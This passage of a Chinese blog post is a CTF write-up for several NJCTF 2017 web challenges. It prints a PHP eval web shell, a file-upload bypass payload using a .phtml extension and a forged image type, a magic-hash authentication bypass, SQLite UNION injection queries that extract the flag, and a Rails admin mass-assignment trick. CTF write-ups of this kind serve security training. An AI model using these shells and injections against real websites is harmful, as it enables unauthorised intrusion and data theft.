+<p>shell.php 文件内容为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">eval</span>($_POST[<span class="string">'HeartSky'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>连上蚁剑就可以 getshell 了<br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/image/NJCTF_2017_1.png" alt="http://7xqn7l.com1.z0.glb.clouddn.com/image/NJCTF_2017_1.png"></p>
+<h3 id="pictures’-wall-400"><a href="#pictures’-wall-400" class="headerlink" title="pictures’ wall - 400"></a>pictures’ wall - 400</h3><blockquote>
+<p>图片墙上有图片<br><a href="http://218.2.197.235:23719/" target="_blank" rel="external">http://218.2.197.235:23719/</a></p>
+</blockquote>
+<p>有一个登录功能，可以实现任意登录(数据没有经过数据库)，登陆上去以后有一个文件上传功能，只有 Root 才能上传文件，但无论以什么用户名登录都会提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Root&apos;s pictureWall</span><br><span class="line">Root has privileges to upload files</span><br></pre></td></tr></table></figure></p>
+<p>发现把 host 改为 127.0.0.1，就能正常使用文件上传功能<br>有检测文件后缀和 MIME 类型，还会检测上传文件的内容</p>
+<p>学到了一种后缀，phtml，在嵌入了 php 脚本的 html 中，使用  phtml 作为后缀名，所以 payload 如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryxCi7MJ9QQAEy6w24</span><br><span class="line">Content-Disposition: form-data; name=&quot;pic&quot;; filename=&quot;test.phtml&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;php&quot;&gt;$_GET[&apos;a&apos;]($_GET[&apos;b&apos;])&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后就 getshell 了，不得不吐槽下看了源码后发现解法都写死了，强行造洞好难受 = =</p>
+<h3 id="Wallet-300"><a href="#Wallet-300" class="headerlink" title="Wallet - 300"></a>Wallet - 300</h3><p>扫目录得到 www.zip 源码包，admin.php 文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"db.php"</span>;</span><br><span class="line">$auth = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"auth"</span>])) &#123;</span><br><span class="line">    $auth = $_COOKIE[<span class="string">"auth"</span>];</span><br><span class="line">    $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">    <span class="keyword">if</span> ($auth == $hsh) &#123;</span><br><span class="line">        $auth = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (sha1((string) $hsh) == md5((string) $auth)) &#123;</span><br><span class="line">            $auth = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $auth = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $auth = <span class="number">0</span>;</span><br><span class="line">    $s = $auth;</span><br><span class="line">    setcookie(<span class="string">"auth"</span>, $s);</span><br><span class="line">    setcookie(<span class="string">"hsh"</span>, sha1((string) $s));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'query'</span>])) &#123;</span><br><span class="line">        $db = <span class="keyword">new</span> SQLite3($SQL_DATABASE, SQLITE3_OPEN_READONLY);</span><br><span class="line">        $qstr = SQLITE3::escapeString($_GET[<span class="string">'query'</span>]);</span><br><span class="line">        $query = <span class="string">"SELECT amount FROM my_wallets WHERE id=&#123;$qstr&#125;"</span>;</span><br><span class="line">        $result = $db-&gt;querySingle($query);</span><br><span class="line">        <span class="keyword">if</span> (!$result === <span class="keyword">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Error - invalid query"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Wallet contains: &#123;$result&#125;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;Admin Page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Welcome to the admin panel!&lt;br /&gt;&lt;br /&gt;&lt;form name='input' action='admin.php' method='get'&gt;Wallet ID: &lt;input type='text' name='query'&gt;&lt;input type='submit' value='Submit Query'&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, not authorized."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>首先要 $auth 为 1，满足<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha1((string) $hsh) == md5((string) $auth</span><br></pre></td></tr></table></figure></p>
+<p>这个才可以，因为是 <code>==</code> ，所以我们可以利用 0e564 == 0 的性质来使得条件成立，详情参考 <a href="https://www.whitehatsec.com/blog/magic-hashes/" target="_blank" rel="external">https://www.whitehatsec.com/blog/magic-hashes/</a></p>
+<p>然后下面就是一个 SQLITE 的注入了<br><a href="http://www.zhutougg.com/2017/02/27/ji-yu-sqliteshu-ju-ku-de-sqlzhu-ru/" target="_blank" rel="external">http://www.zhutougg.com/2017/02/27/ji-yu-sqliteshu-ju-ku-de-sqlzhu-ru/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=-1 union select 1</span><br></pre></td></tr></table></figure></p>
+<p>可以输出我们想要的值，要先获得表名，SQLITE 没有像 MySQL 中那样包含所有数据库、表、列的 information_schema 库。事实上，对于它而言，没有库的概念，直接对象是表，但是它是有系统表的，即 <code>sqlite_master</code>，表中有这些字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">type 类型</span><br><span class="line">name 索引</span><br><span class="line">tbl_name 表名</span><br><span class="line">sql 创建该表的 SQL 语句</span><br></pre></td></tr></table></figure></p>
+<p>因此我们可以从这个表中得到所有表名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query=-1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(tbl_name) <span class="keyword">from</span> sqlite_master</span><br><span class="line"><span class="keyword">Wallet</span> contains: flag,flag,my_wallets,my_wallets</span><br></pre></td></tr></table></figure></p>
+<p>猜测 flag 是在 flag 表中，查询 sql 来得到列<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query=-1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">sql</span>) <span class="keyword">from</span> sqlite_master</span><br><span class="line"><span class="keyword">Wallet</span> contains: <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> flag (<span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">not</span> <span class="literal">null</span>, amount <span class="built_in">int</span>(<span class="number">30</span>) <span class="keyword">not</span> <span class="literal">null</span> <span class="keyword">default</span> <span class="number">0</span>, primary <span class="keyword">key</span>(<span class="keyword">id</span>)),<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> my_wallets (<span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">40</span>) <span class="keyword">not</span> <span class="literal">null</span>, amount <span class="built_in">int</span>(<span class="number">30</span>) <span class="keyword">not</span> <span class="literal">null</span> <span class="keyword">default</span> <span class="number">0</span>, primary <span class="keyword">key</span>(<span class="keyword">id</span>))</span><br></pre></td></tr></table></figure></p>
+<p>最后 flag 是在 flag 表中的 id 列<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query=-1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">id</span>) <span class="keyword">from</span> flag</span><br><span class="line"><span class="keyword">Wallet</span> contains: NJCTF&#123;Th3_m1xtu2e_0F_M4gic_Ha5h_@nd_5Qlite_InJec7ion&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="Blog-150"><a href="#Blog-150" class="headerlink" title="Blog - 150"></a>Blog - 150</h3><blockquote>
+<p>前端养成之路，从写博客开始<br><a href="http://218.2.197.235:23727" target="_blank" rel="external">http://218.2.197.235:23727</a></p>
+</blockquote>
+<p>打开后是一个 Ruby 写的站，提供了源码，因为用 laravel 写过站，很容易看出是用框架写的站，直接看控制器里注册那一部分<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">user_params</span></span></span><br><span class="line">    params.<span class="keyword">require</span>(<span class="symbol">:user</span>).permit(<span class="symbol">:name</span>, <span class="symbol">:email</span>, <span class="symbol">:password</span>, <span class="symbol">:password_confirmation</span>, <span class="symbol">:admin</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到注册时有 admin 这个参数，但是注册时抓包看一下却没有，然后再去看下创建数据库的语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create_table "users", force: true <span class="keyword">do</span> |t|</span><br><span class="line">  t.string   <span class="string">"name"</span></span><br><span class="line">  t.string   <span class="string">"email"</span></span><br><span class="line">  t.datetime <span class="string">"created_at"</span></span><br><span class="line">  t.datetime <span class="string">"updated_at"</span></span><br><span class="line">  t.string   <span class="string">"password_digest"</span></span><br><span class="line">  t.string   <span class="string">"remember_token"</span></span><br><span class="line">  t.boolean  <span class="string">"admin"</span>,           <span class="keyword">default</span>: <span class="literal">false</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>
+<p>admin 参数默认为0，也就是说如果 admin 为1的话，就是管理员了<br>注册时加上 <code>user[admin]=1</code>，因为用户列表中有提示 <code>&lt;!--flag is here--&gt;</code>，所以 flag 就在这里</p>
+<p>先写这些，其他的待会再来补</p>
+
+  </section>
+
+  
+  
+</article>
+
+
+            <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer class="footer">
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+    <span class="footer__copyright">&copy; 2016-2017. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a> | <a href="https://coding.net/u/HeartSky/p/HeartSky/git/pages">Hosted by Coding Pages</a></span>  
+</footer>
+
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['$','$'],['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    <script src="http://s11.cnzz.com/z_stat.php?id=1259147269&web_id=1259147269" language="JavaScript"></script>
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
